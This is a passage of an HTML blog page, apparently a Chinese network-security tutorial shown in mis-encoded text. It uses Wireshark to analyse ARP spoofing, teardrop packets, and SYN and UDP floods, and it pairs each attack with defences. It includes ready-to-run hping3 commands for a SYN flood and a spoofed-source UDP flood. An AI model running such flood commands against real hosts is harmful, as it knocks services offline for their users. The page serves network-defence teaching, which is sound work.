srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h4 id="æŸ¥æ‰¾æºå¤´ç«¯å£"><a href="#æŸ¥æ‰¾æºå¤´ç«¯å£" class="headerlink" title="æŸ¥æ‰¾æºå¤´ç«¯å£"></a>æŸ¥æ‰¾æºå¤´ç«¯å£</h4><p>äº¤æ¢æœº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">display mac-address</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°å¯¹åº”çš„ç«¯å£<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756855361-66220b4e-54d5-403c-a181-0bacbd3849e3.png#align=left&display=inline&height=437&margin=%5Bobject%20Object%5D&name=image.png&originHeight=874&originWidth=1508&size=566939&status=done&style=none&width=754" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756855361-66220b4e-54d5-403c-a181-0bacbd3849e3.png#align=left&display=inline&height=437&margin=%5Bobject%20Object%5D&name=image.png&originHeight=874&originWidth=1508&size=566939&status=done&style=none&width=754" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h4 id="é˜²å¾¡ç­–ç•¥"><a href="#é˜²å¾¡ç­–ç•¥" class="headerlink" title="é˜²å¾¡ç­–ç•¥"></a>é˜²å¾¡ç­–ç•¥</h4><p>é™åˆ¶äº¤æ¢æœºç«¯å£ MAC åœ°å€æ•°é‡ï¼Œæ¯”å¦‚è¿™ä¸ªç«¯å£åªèƒ½æœ‰3æˆ–5ä¸ªï¼Œé‚£ä»–å°±åªèƒ½æ·»åŠ 3æˆ–5è·³è®°å½•åˆ°CAMè¡¨ï¼Œé‚£ä¹ˆå°±æ— æ³•æº¢å‡ºå•¦ã€‚</p><h3 id="STPæ“çºµ"><a href="#STPæ“çºµ" class="headerlink" title="STPæ“çºµ"></a>STPæ“çºµ</h3><p>ç”Ÿæˆæ ‘åè®®æŒ‰ç…§æ ‘çš„ç»“æ„æ„é€ ç½‘ç»œæ‹“æ‰‘ï¼Œé¿å…å½¢æˆå›è·¯ã€‚STPåè®®ä¸­çš„å„äº¤æ¢æœºé€šè¿‡äº¤æ¢BPDUæŠ¥æ–‡ä¿¡æ¯ä¼ æ’­ç”Ÿæˆæ ‘ä¿¡æ¯ï¼Œå¦‚æœä¼ªé€ BPDUæŠ¥æ–‡ï¼Œæ§åˆ¶äº¤æ¢æœºçš„ç«¯å£è½¬å‘çŠ¶æ€ï¼Œä»è€ŒåŠ¨æ€æ”¹å˜ç½‘ç»œæ‹“æ‰‘ï¼ŒåŠ«æŒç½‘ç»œæµé‡åˆ°æœ¬åœ°ã€‚</p><h3 id="å¹¿æ’­é£æš´"><a href="#å¹¿æ’­é£æš´" class="headerlink" title="å¹¿æ’­é£æš´"></a>å¹¿æ’­é£æš´</h3><p>ARP DHCP é€šè¿‡åœ¨å±€åŸŸç½‘ä¸­å¹¿æ’­ï¼Œå ç”¨ç½‘ç»œèµ„æºï¼Œç½‘ç»œæ€§èƒ½ä¸‹é™ -&gt; ç½‘ç»œé€Ÿåº¦å˜æ…¢<br>äº§ç”ŸåŸå› </p><ul><li>ç½‘ç»œçŸ­è·¯å¼•å‘å¹¿æ’­é£æš´ -&gt; 8æ ¹è¿æ¥ ä¸¤ä¸¤è¿æ¥ -&gt; äº’è”ç½‘ä¸Šç½‘çº¿å¯¼è‡´ç½‘ç»œæ€§èƒ½ä¸‹é™</li><li>ç½‘ç»œä¸­å­˜åœ¨ç¯è·¯å¼•å‘å¹¿æ’­é£æš´</li><li>ç½‘å¡æŸåå¼•å‘å¹¿æ’­é£æš´</li><li>è •è™«ç—…æ¯’å¼•å‘å¹¿æ’­é£æš´</li></ul><h2 id="ç½‘ç»œå±‚å®‰å…¨"><a href="#ç½‘ç»œå±‚å®‰å…¨" class="headerlink" title="ç½‘ç»œå±‚å®‰å…¨"></a>ç½‘ç»œå±‚å®‰å…¨</h2><h3 id="ä¸­é—´äººå®‰å…¨æµ‹è¯•-æ¬ºéª—"><a href="#ä¸­é—´äººå®‰å…¨æµ‹è¯•-æ¬ºéª—" class="headerlink" title="ä¸­é—´äººå®‰å…¨æµ‹è¯• - æ¬ºéª—"></a>ä¸­é—´äººå®‰å…¨æµ‹è¯• - æ¬ºéª—</h3><h4 id="ARPåè®®"><a href="#ARPåè®®" class="headerlink" title="ARPåè®®"></a>ARPåè®®</h4><ul><li>å±€åŸŸç½‘å†…ç”¨æ¥å¯»æ‰¾ä¸»æœºå‘é€æ•°æ®åŒ…çš„åè®®ï¼Œé€šè¿‡å®ƒå¯ä»¥æ‰¾åˆ°æŒ‡å®š IP åœ°å€å¯¹åº”çš„ MACåœ°å€</li><li>æ¯å°ç»ˆç«¯è®¾å¤‡éƒ½å…·æœ‰ARPç¼“å­˜è¡¨<ul><li><code>arp -a</code> æŸ¥çœ‹ç¼“å­˜è¡¨</li><li><code>arp -d</code> åˆ é™¤ç¼“å­˜è¡¨</li><li>è¡¨çš„å¡«å……ï¼Œå¯»æ‰¾ IP åœ°å€å¯¹åº”MACåœ°å€ï¼Œå¦‚æœæ²¡æœ‰åˆ™å¹¿æ’­æ­¤æ—¶è®¾ç½®çš„ç›®æ ‡MACåœ°å€ä¸º (00:00:00:00:00:00) æ˜¯å¦å…·æœ‰IPåœ°å€å¯¹åº”çš„MACåœ°å€ï¼Œæ‰¾åˆ°å¡«å……ã€‚</li></ul></li></ul><h4 id="ARPåè®®åˆ†æä»‹ç»"><a href="#ARPåè®®åˆ†æä»‹ç»" class="headerlink" title="ARPåè®®åˆ†æä»‹ç»"></a>ARPåè®®åˆ†æä»‹ç»</h4><p>æ˜¾ç¤ºè¿‡æ»¤å™¨</p><ul><li>arp</li><li>è¯·æ±‚æ•°æ®åŒ…<ul><li>arp.opcode == 0x0001</li></ul></li><li>å“åº”æ•°æ®åŒ…<ul><li>arp.opcode == 0x0002</li></ul></li><li>æŸ¥çœ‹æº MAC åœ°å€<ul><li>arp.src.hw_mac == 00:00:00:00:00:00</li><li>arp.src.hw_mac == 00:00:00:00:00:00 &amp;&amp; arp.opcode == 0x0002</li></ul></li></ul><h4 id="ä¸“å®¶ç³»ç»Ÿåˆ†æ"><a href="#ä¸“å®¶ç³»ç»Ÿåˆ†æ" class="headerlink" title="ä¸“å®¶ç³»ç»Ÿåˆ†æ"></a>ä¸“å®¶ç³»ç»Ÿåˆ†æ</h4><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605765841082-6ff4962a-2263-4a9d-91a3-c7c7de181c55.png#align=left&display=inline&height=111&margin=%5Bobject%20Object%5D&name=image.png&originHeight=222&originWidth=1902&size=25972&status=done&style=none&width=951" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605765841082-6ff4962a-2263-4a9d-91a3-c7c7de181c55.png#align=left&display=inline&height=111&margin=%5Bobject%20Object%5D&name=image.png&originHeight=222&originWidth=1902&size=25972&status=done&style=none&width=951" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>ç½‘å…³åœ°å€ä¸å±€åŸŸç½‘ä¸­çš„è®¡ç®—æœºå…·æœ‰ä¸€è‡´çš„MACåœ°å€<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605765875092-b18fe093-4d31-49d3-8ce6-b0970dc062a9.png#align=left&display=inline&height=234&margin=%5Bobject%20Object%5D&name=image.png&originHeight=468&originWidth=1358&size=730973&status=done&style=none&width=679" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605765875092-b18fe093-4d31-49d3-8ce6-b0970dc062a9.png#align=left&display=inline&height=234&margin=%5Bobject%20Object%5D&name=image.png&originHeight=468&originWidth=1358&size=730973&status=done&style=none&width=679" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h4 id="å‡ºç°å¤§é‡ARPæ•°æ®åŒ…çš„åŸå› "><a href="#å‡ºç°å¤§é‡ARPæ•°æ®åŒ…çš„åŸå› " class="headerlink" title="å‡ºç°å¤§é‡ARPæ•°æ®åŒ…çš„åŸå› "></a>å‡ºç°å¤§é‡ARPæ•°æ®åŒ…çš„åŸå› </h4><ul><li>ARPä¸»æœºæ‰«æ</li><li>ARPç—…æ¯’è¿›è¡Œé€šä¿¡</li><li>ARPæ¬ºéª— ä¸­é—´äººå®‰å…¨æµ‹è¯•</li></ul><h4 id="é˜²å¾¡ARPæ¬ºéª—æªæ–½"><a href="#é˜²å¾¡ARPæ¬ºéª—æªæ–½" class="headerlink" title="é˜²å¾¡ARPæ¬ºéª—æªæ–½"></a>é˜²å¾¡ARPæ¬ºéª—æªæ–½</h4><ul><li>é™æ€ç»‘å®šARPè¡¨<ul><li>arp -s ç½‘å…³çš„IPåœ°å€ ç½‘å…³çš„MACåœ°å€<ul><li>ä¸é€‚åˆå¤§å‹ç½‘ç»œä½¿ç”¨</li><li>éœ€è¦ç®¡ç†å‘˜æƒé™</li><li>win <code>netsh i i show in</code> -&gt; æŸ¥çœ‹ç½‘å¡ç¼–å·</li><li>win <code>netsh -c &quot;i i&quot; add neighbors &lt;ç½‘å¡ç¼–å·&gt; &lt;ç½‘å…³IPåœ°å€&gt; &lt;ç½‘å…³MACåœ°å€&gt;</code></li></ul></li></ul></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605768196250-3b6f5a7b-e2a3-448d-8b6e-d6534a814bdf.png#align=left&display=inline&height=218&margin=%5Bobject%20Object%5D&name=image.png&originHeight=480&originWidth=1516&size=593279&status=done&style=stroke&width=687" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605768196250-3b6f5a7b-e2a3-448d-8b6e-d6534a814bdf.png#align=left&display=inline&height=218&margin=%5Bobject%20Object%5D&name=image.png&originHeight=480&originWidth=1516&size=593279&status=done&style=stroke&width=687" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><pre><code>  - éªŒè¯æ˜¯å¦é™æ€ç»‘å®š `arp -a`</code></pre><ul><li>äº¤æ¢æœºä¹Ÿæœ‰ç«¯å£å®‰å…¨é…ç½®ï¼Œå›ºå®šMACå’ŒIPä½¿ç”¨ç«¯å£<ul><li>ä¸é€‚åˆå¤§å‹ç½‘ç»œä½¿ç”¨</li></ul></li><li>äº¤æ¢æœº DHCP-Snooping<ul><li>äº¤æ¢æœºç›‘å¬DHCPæ•°æ®ï¼Œæå–IPå’ŒMACå»ºç«‹DHCP Snoopingçš„ç»‘å®šè¡¨</li></ul></li><li>åˆ’åˆ†VLAN<ul><li>æ¯ä¸€ä¸ªVLANå°±æ˜¯ä¸€ä¸ªå¹¿æ’­åŸŸ -&gt; é™åˆ¶ç½‘ç»œèŒƒå›´</li></ul></li></ul><h3 id="æ³ªæ»´å®‰å…¨æµ‹è¯•"><a href="#æ³ªæ»´å®‰å…¨æµ‹è¯•" class="headerlink" title="æ³ªæ»´å®‰å…¨æµ‹è¯•"></a>æ³ªæ»´å®‰å…¨æµ‹è¯•</h3><p>åŸç†ä»‹ç»</p><ul><li>é’ˆå¯¹äºIPåè®®çš„å®‰å…¨æµ‹è¯•ï¼Œä¸»è¦æ˜¯ä¼ªé€ IPåœ°å€å’Œå‘é€ç•¸å½¢æ•°æ®åŒ…</li><li>å‘ç›®æ ‡å‘é€ç•¸å½¢æ•°æ®åŒ…ï¼Œä½¿å¾—IPæ•°æ®åŒ…ç¢ç‰‡åœ¨é‡ç»„çš„è¿‡ç¨‹ä¸­æœ‰é‡åˆçš„éƒ¨åˆ†ï¼ˆåç§»ä½ç½®ä¸å¤Ÿï¼‰ï¼Œä»è€Œå¯¼è‡´ç›®æ ‡ç³»ç»Ÿæ— æ³•è¿›è¡Œé‡ç»„ï¼Œè¿›ä¸€æ­¥å¯¼è‡´ç³»ç»Ÿå¥”æºƒè€Œåœæ­¢æœåŠ¡ã€‚</li></ul><p>ä¸‹è½½IPåè®®æ¡ˆä¾‹æ•°æ®åŒ…: <a href="https://wiki.wireshark.org/SampleCaptures?action=AttachFile&do=get&target=teardrop.cap">https://wiki.wireshark.org/SampleCaptures?action=AttachFile&amp;do=get&amp;target=teardrop.cap</a></p><p>æ ¹æ®æ•°æ®åŒ…è¡¨ç¤º Identification æ¥ç¡®å®æ˜¯å¦å±äºåŒä¸€åˆ†ç»„<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605768822557-4469d415-8fb1-41f5-ad0b-7fbdfc713d8c.png#align=left&display=inline&height=454&margin=%5Bobject%20Object%5D&name=image.png&originHeight=908&originWidth=1780&size=235391&status=done&style=none&width=890" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605768822557-4469d415-8fb1-41f5-ad0b-7fbdfc713d8c.png#align=left&display=inline&height=454&margin=%5Bobject%20Object%5D&name=image.png&originHeight=908&originWidth=1780&size=235391&status=done&style=none&width=890" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>åˆ†æ ç¬¬8å’Œç¬¬9ä¸ªæ•°æ®åŒ…<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605770172122-e947f493-6485-40e5-b24f-372f33908a7a.png#align=left&display=inline&height=428&margin=%5Bobject%20Object%5D&name=image.png&originHeight=856&originWidth=2088&size=223939&status=done&style=none&width=1044" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605770172122-e947f493-6485-40e5-b24f-372f33908a7a.png#align=left&display=inline&height=428&margin=%5Bobject%20Object%5D&name=image.png&originHeight=856&originWidth=2088&size=223939&status=done&style=none&width=1044" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>åç§»é‡ä»…ä¸º 24ï¼Œè¿œä¸å¤Ÿ36ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605770235520-f1bfbd04-dae5-411c-a191-3c65013266ae.png#align=left&display=inline&height=407&margin=%5Bobject%20Object%5D&name=image.png&originHeight=814&originWidth=2128&size=235361&status=done&style=none&width=1064" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605770235520-f1bfbd04-dae5-411c-a191-3c65013266ae.png#align=left&display=inline&height=407&margin=%5Bobject%20Object%5D&name=image.png&originHeight=814&originWidth=2128&size=235361&status=done&style=none&width=1064" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>å› æ­¤æ— æ³•é‡ç»„</p><p>ä¸è¿‡å¯¹ç°åœ¨çš„è®¡ç®—æœºæ¥è¯´ï¼Œæ³ªæ»´æµ‹è¯•ä¸ä¼šå¯¹è®¡ç®—æœºé€ æˆå¾ˆå¤§çš„å½±å“ï¼Œæ‰€ä»¥åŸºæœ¬ä¸å…³å¿ƒæ³ªæ»´å®‰å…¨æµ‹è¯•äº†ã€‚ä¸å¤Ÿæ³ªæ»´æµ‹è¯•å’ŒARPæ³›æ´ªç»“åˆï¼Œè¿˜æ˜¯èƒ½å¯¹è®¡ç®—æœºé€ æˆå¾ˆå¤§çš„å›°æ‰°ã€‚</p><h2 id="ä¼ è¾“å±‚å®‰å…¨"><a href="#ä¼ è¾“å±‚å®‰å…¨" class="headerlink" title="ä¼ è¾“å±‚å®‰å…¨"></a>ä¼ è¾“å±‚å®‰å…¨</h2><p>ä¼ è¾“å±‚ä¸»è¦é’ˆå¯¹TCPå’ŒUDPåè®®ï¼Œå› æ­¤æ‹’ç»æœåŠ¡DOSï¼ˆDenial of Serviceï¼‰ä¹Ÿä¸»è¦æ˜¯åŸºäºè¿™ä¸¤ä¸ªåè®® </p><h3 id="TCP-SYN-æ³›æ´ª"><a href="#TCP-SYN-æ³›æ´ª" class="headerlink" title="TCP SYN æ³›æ´ª"></a>TCP SYN æ³›æ´ª</h3><h4 id="TCPè¿æ¥ä»‹ç»"><a href="#TCPè¿æ¥ä»‹ç»" class="headerlink" title="TCPè¿æ¥ä»‹ç»"></a>TCPè¿æ¥ä»‹ç»</h4><ul><li>å®¢æˆ·ç«¯å‘é€SYNåˆ°æœåŠ¡å™¨</li><li>æœåŠ¡å™¨å“åº” SYN+ACK åˆ°å®¢æˆ·æœº</li><li>å®¢æˆ·æœºå‘é€ACKåˆ°æœåŠ¡å™¨</li></ul><p>ä½¿ç”¨ wireshark åˆ†æ TCP ä¸‰æ¬¡æ¡æ‰‹æ•°æ®åŒ…<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605793725479-0c582547-d917-4fc3-9cff-31c4d18b2c2b.png#align=left&display=inline&height=147&margin=%5Bobject%20Object%5D&name=image.png&originHeight=294&originWidth=2562&size=134618&status=done&style=none&width=1281" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605793725479-0c582547-d917-4fc3-9cff-31c4d18b2c2b.png#align=left&display=inline&height=147&margin=%5Bobject%20Object%5D&name=image.png&originHeight=294&originWidth=2562&size=134618&status=done&style=none&width=1281" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h4 id="TCP-SYN-flooding-å®‰å…¨æµ‹è¯•"><a href="#TCP-SYN-flooding-å®‰å…¨æµ‹è¯•" class="headerlink" title="TCP SYN flooding å®‰å…¨æµ‹è¯•"></a>TCP SYN flooding å®‰å…¨æµ‹è¯•</h4><p>åŸç†</p><ul><li>å®¢æˆ·ç«¯å‘é€synæœåŠ¡ç«¯è¿”å›syn+ackï¼Œå¦‚æœå®¢æˆ·ç«¯ä¸å†å‘é€ackï¼Œé‚£ä¹ˆæœåŠ¡ç«¯å°†ç­‰å¾…è¶…æ—¶ï¼Œé‡æ–°å‘é€syn+ackã€‚å¦‚æœæ˜¯å¤§é‡çš„ç­‰å¾…ï¼Œå°±å¯èƒ½å¯¼è‡´æœåŠ¡å™¨å¥”æºƒã€‚</li></ul><p>æ¡ˆä¾‹æ¼”ç¤º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -q -n --rand-source -S -p 80 --flood &lt;ç›®æ ‡IPåœ°å€&gt;</span><br></pre></td></tr></table></figure><ul><li>-q: å®‰é™æ¨¡å¼ </li><li>-n: æ•°å­—åŒ–è¾“å‡ºï¼Œè±¡å¾æ€§è¾“å‡ºä¸»æœºåœ°å€</li><li>â€“rand-source: éšæœºæºIP</li><li>-S: å‘é€SYNæ•°æ®åŒ…</li><li>-p: æŒ‡å‘ç«¯å£</li><li>â€“flood: ä½¿ç”¨æ³›æ´ª</li></ul><p>ä¸ºäº†ä¾¿äºåˆ†æã€‚æ‰“å¼€ Statistics -&gt; Flow Graph<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605798164166-c6513ee3-00d1-44ae-96a3-f1e112fa6e14.png#align=left&display=inline&height=411&margin=%5Bobject%20Object%5D&name=image.png&originHeight=822&originWidth=976&size=115134&status=done&style=none&width=488" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605798164166-c6513ee3-00d1-44ae-96a3-f1e112fa6e14.png#align=left&display=inline&height=411&margin=%5Bobject%20Object%5D&name=image.png&originHeight=822&originWidth=976&size=115134&status=done&style=none&width=488" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>å…ˆé€‰æ‹©æµç±»å‹ä¸ºTCP<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605799515559-2a58b00c-81af-4d24-af39-eb8c19774b5d.png#align=left&display=inline&height=678&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1356&originWidth=1806&size=131163&status=done&style=none&width=903" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605799515559-2a58b00c-81af-4d24-af39-eb8c19774b5d.png#align=left&display=inline&height=678&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1356&originWidth=1806&size=131163&status=done&style=none&width=903" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>å‘ç°å®¢æˆ·ç«¯å‘é€synæœåŠ¡ç«¯è¿”å›syn+ackï¼Œä½†å®¢æˆ·ç«¯ä¸å†å‘é€ackï¼Œå¯¼è‡´èµ„æºæ¶ˆè€—ã€‚</p><h4 id="TCP-SYN-floodingå®‰å…¨é˜²å¾¡"><a href="#TCP-SYN-floodingå®‰å…¨é˜²å¾¡" class="headerlink" title="TCP SYN floodingå®‰å…¨é˜²å¾¡"></a>TCP SYN floodingå®‰å…¨é˜²å¾¡</h4><ul><li>ä¸¢å¼ƒç¬¬ä¸€ä¸ªSYNæ•°æ®åŒ… -&gt; ç”¨æˆ·ä½“éªŒå·®</li><li>åå‘æ¢æµ‹ -&gt; å‘æºåœ°å€æ–¹å‘å‘é€æ¢æµ‹åŒ…ï¼Œç¡®å®šæºåœ°å€åˆæ³•æ€§</li><li>ä»£ç†æ¨¡å¼ -&gt; é˜²ç«å¢™ä»£ç† -&gt; å³å…ˆä¸é˜²ç«å¢™å»ºç«‹tcpè¿æ¥</li></ul><h3 id="UDP-æ³›æ´ª"><a href="#UDP-æ³›æ´ª" class="headerlink" title="UDP æ³›æ´ª"></a>UDP æ³›æ´ª</h3><p>éè¿æ¥çŠ¶æ€çš„åè®®ï¼Œç®€æ´åè®®ï¼Œæ§åˆ¶é€‰é¡¹å°‘ï¼Œä¸å¯é ï¼Œä¼ è¾“é€Ÿç‡é«˜ï¼Œé€‚åˆå¤§æ–‡ä»¶ä¼ è¾“</p><p>UDPåè®®å…³é”®ç‚¹</p><ul><li>æºç«¯å£</li><li>ç›®çš„ç«¯å£</li><li>UDPæŠ¥æ–‡é•¿åº¦</li><li>æ£€éªŒç </li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605839057960-48412a34-8873-4ff3-9044-f54e09ea3cfb.png#align=left&display=inline&height=630&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1260&originWidth=1632&size=255005&status=done&style=none&width=816" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605839057960-48412a34-8873-4ff3-9044-f54e09ea3cfb.png#align=left&display=inline&height=630&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1260&originWidth=1632&size=255005&status=done&style=none&width=816" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h4 id="UDP-flooding-å®‰å…¨æµ‹è¯•"><a href="#UDP-flooding-å®‰å…¨æµ‹è¯•" class="headerlink" title="UDP flooding å®‰å…¨æµ‹è¯•"></a>UDP flooding å®‰å…¨æµ‹è¯•</h4><p>åŸç†: æµ‹è¯•äººå‘˜å‘ç›®æ ‡å‘é€å¤§é‡å·¨å¤§çš„UDPæ•°æ®åŒ…ï¼Œå°±ä¼šä½¿ç½‘ç»œèµ„æºè¢«è€—å°½</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo hping3 -q -n -a &lt;fake_ip&gt; --udp -s 53 -p &lt;dst_port&gt; --flood &lt;target_ip&gt; -d 1000</span><br></pre></td></tr></table></figure><p>-a: ä¼ªé€ çš„ ip<br>-s: 53ç«¯å£<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605840005031-623d1d8e-754a-422d-a359-193d2d5888c1.png#align=left&display=inline&height=647&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1294&originWidth=1852&size=317845&status=done&style=none&width=926" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605840005031-623d1d8e-754a-422d-a359-193d2d5888c1.png#align=left&display=inline&height=647&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1294&originWidth=1852&size=317845&status=done&style=none&width=926" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h4 id="UDP-flooding-å®‰å…¨é˜²å¾¡"><a href="#UDP-flooding-å®‰å…¨é˜²å¾¡" class="headerlink" title="UDP flooding å®‰å…¨é˜²å¾¡"></a>UDP flooding å®‰å…¨é˜²å¾¡</h4><p>é˜²ç«å¢™</p><ul><li>é™æµ: å°†é“¾è·¯ä¸­çš„UDPæŠ¥æ–‡æ§åˆ¶åœ¨åˆç†çš„èŒƒå›´ï¼Œå½“è¶…è¿‡æŒ‡å®šå€¼ï¼Œåˆ™ä¸¢å¼ƒUDPæŠ¥æ–‡</li><li>æŒ‡çº¹å­¦ä¹ : å…ˆå­¦ä¹ ï¼Œåœ¨åŒ¹é…</li></ul><h3 id="ç½‘ç»œå–è¯ç®€æ"><a href="#ç½‘ç»œå–è¯ç®€æ" class="headerlink" title="ç½‘ç»œå–è¯ç®€æ"></a>ç½‘ç»œå–è¯ç®€æ</h3><h4 id="wireshark-æ¢å¤ä¼ è¾“æ–‡ä»¶"><a href="#wireshark-æ¢å¤ä¼ è¾“æ–‡ä»¶" class="headerlink" title="wireshark æ¢å¤ä¼ è¾“æ–‡ä»¶"></a>wireshark æ¢å¤ä¼ è¾“æ–‡ä»¶</h4><p>æ— è®ºä½¿ç”¨ä½•ç§åº”ç”¨å±‚åè®®ï¼Œå¯¹äºä¼ 